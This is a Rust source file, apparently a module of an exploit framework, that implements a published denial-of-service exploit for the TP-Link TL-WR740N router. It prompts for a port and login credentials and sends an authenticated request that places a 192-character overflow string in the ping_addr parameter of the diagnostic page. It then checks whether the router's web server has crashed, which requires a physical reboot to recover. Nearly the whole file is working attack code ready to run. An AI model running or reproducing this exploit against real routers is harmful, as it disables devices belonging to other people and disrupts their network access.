// Exploit Title: TP-Link TL-WR740N - Buffer Overflow 'DOS'
// Date: 8/12/2023
// Exploit Author: Anish Feroz (ZEROXINN)
// Vendor Homepage: http://www.tp-link.com
// Version: TP-Link TL-WR740n 3.12.11 Build 110915 Rel.40896n
// Tested on: TP-Link TL-WR740N

// Description:
// There exists a buffer overflow vulnerability in TP-Link TL-WR740 router
// that can allow an attacker to crash the web server running on the router
// by sending a crafted request. To bring back the http (webserver),
// a user must physically reboot the router.

use anyhow::{Result, Context};
use std::io::Write;
use base64::{engine::general_purpose, Engine as _};
use colored::*;
use reqwest::{header::HeaderMap, Client};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

use crate::utils::{normalize_target, prompt_port};

const DEFAULT_PORT: u16 = 8082;
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   TP-Link TL-WR740N Buffer Overflow DoS Exploit           ║".cyan());
    println!("{}", "║   Crashes router web server via crafted ping request      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}



/// Internal function to send crafted request to crash router
async fn execute(ip: &str, port: u16, username: &str, password: &str) -> Result<()> {
    // Normalize the IP for correct URL formatting
    let ip = normalize_target(ip)?;

    // Create a crash pattern of exact 192 characters using "crash_crash_on_a_loop_"
    let crash_pattern = "crash_crash_on_a_loop_";
    let repeated = crash_pattern.repeat(9); // 9*22 = 198 > 192
    let payload = &repeated[..192]; // truncate to exact length

    // Construct vulnerable URL
    let target_url = format!(
        "http://{ip}:{port}/userRpm/PingIframeRpm.htm?ping_addr={payload}&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20",
        ip = ip,
        port = port,
        payload = payload
    );

    println!("{}", format!("[*] Sending exploit payload to {}:{}", ip, port).yellow());

    // Build basic auth header
    let credentials = format!("{username}:{password}");
    let encoded_credentials = general_purpose::STANDARD.encode(credentials.as_bytes());

    // Prepare HTTP headers
    let mut headers = HeaderMap::new();
    headers.insert("Host", format!("{ip}:{port}", ip = ip, port = port).parse()?);
    headers.insert("Authorization", format!("Basic {}", encoded_credentials).parse()?);
    headers.insert("Upgrade-Insecure-Requests", "1".parse()?);
    headers.insert("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36".parse()?);
    headers.insert("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9".parse()?);
    headers.insert("Referer", format!("http://{ip}:{port}/userRpm/DiagnosticRpm.htm", ip = ip, port = port).parse()?);
    headers.insert("Accept-Encoding", "gzip, deflate".parse()?);
    headers.insert("Accept-Language", "en-US,en;q=0.9".parse()?);
    headers.insert("Connection", "close".parse()?);

    let client = Client::builder()
        .default_headers(headers)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    let response = client.get(&target_url).send().await?;

    if response.status().as_u16() == 200 {
        println!("{}", "[+] Exploit sent successfully (200 OK received)".green().bold());
        let body = response.text().await.unwrap_or_default();
        if !body.is_empty() {
            println!("{}", body);
        }
    } else {
        println!(
            "{}",
            format!("[-] Request completed with status code: {}", response.status()).yellow()
        );
    }

    // Check if the host is still up — timeout after 1 second
    println!("{}", "[*] Checking if target is still reachable...".cyan());
    match timeout(Duration::from_secs(1), TcpStream::connect((ip.trim_matches(&['[', ']'][..]), port))).await {
        Ok(Ok(_)) => {
            println!("{}", format!("[!] Target still responds on port {}. DoS may have failed.", port).yellow());
        }
        _ => {
            println!("{}", format!("[+] Target no longer reachable on port {} — likely crashed!", port).green().bold());
        }
    }

    Ok(())
}

/// Entry point required by auto-dispatch
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    let port: u16 = prompt_port(&format!("Enter router port (default {})", DEFAULT_PORT), DEFAULT_PORT)?;

    print!("{}", "Enter username: ".cyan().bold());
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut username = String::new();
    std::io::stdin()
        .read_line(&mut username)
        .context("Failed to read username")?;
    let username = username.trim();

    print!("{}", "Enter password: ".cyan().bold());
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut password = String::new();
    std::io::stdin()
        .read_line(&mut password)
        .context("Failed to read password")?;
    let password = password.trim();

    if username.is_empty() || password.is_empty() {
        println!("{}", "[-] Username and password are required".red());
        return Err(anyhow::anyhow!("Username and password are required"));
    }

    execute(target, port, username, password).await
}
